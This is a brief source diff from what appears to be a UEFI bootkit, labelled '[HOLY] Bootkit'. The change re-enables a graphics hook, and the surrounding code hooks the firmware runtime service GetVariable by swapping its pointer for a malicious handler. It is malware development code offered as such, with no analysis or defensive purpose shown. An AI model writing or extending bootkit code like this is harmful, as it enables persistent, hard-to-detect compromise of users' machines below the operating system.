@@ -507,9 +507,9 @@ EFI_STATUS EFIAPI UefiMain(const EFI_HANDLE imageHandle, EFI_SYSTEM_TABLE* syste
     gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Bootkit executing with minimal logging...\r\n");
     gBS->Stall(3000000);
 
-    // Disable graphics hook to isolate crash
-    // InstallGraphicsHook();
-    // gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Graphics hook installed.\r\n");
+    // Enable graphics hook
+    InstallGraphicsHook();
+    gST->ConOut->OutputString(gST->ConOut, L"[HOLY] Graphics hook installed.\r\n");
 
     // ENABLE service hooks to test the safe memory scan
     OriginalGetVariable = (EFI_GET_VARIABLE)SetServicePointer(&gRT->Hdr, (VOID**)&gRT->GetVariable, (VOID*)HookedGetVariable);
